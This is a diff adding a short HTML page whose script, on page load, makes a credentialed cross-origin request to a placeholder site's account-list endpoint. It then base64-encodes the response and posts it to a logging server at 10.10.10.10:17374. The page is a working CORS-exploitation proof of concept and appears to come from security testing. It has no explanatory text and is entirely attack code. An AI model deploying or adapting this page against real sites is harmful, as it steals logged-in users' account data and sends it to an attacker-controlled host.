@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script>
+            var req = new XMLHttpRequest();     
+            req.onload = reqListener;
+            req.open('get', 'https://xxx.yyy.zzz/accountList', true);
+            req.withCredentials = true;
+            req.send();
+
+            function reqListener() {
+                var req1 = new XMLHttpRequest();
+                req1.open('post', 'http://10.10.10.10:17374/log', true);
+                req1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
+                req1.withCredentials = true;
+                
+                // console.log('1111'+this.responseText);
+                b64Str = window.btoa(window.encodeURIComponent(this.responseText));
+                req1.send('content=' + b64Str);
+            }
+        </script>
+    </head>
+</html>
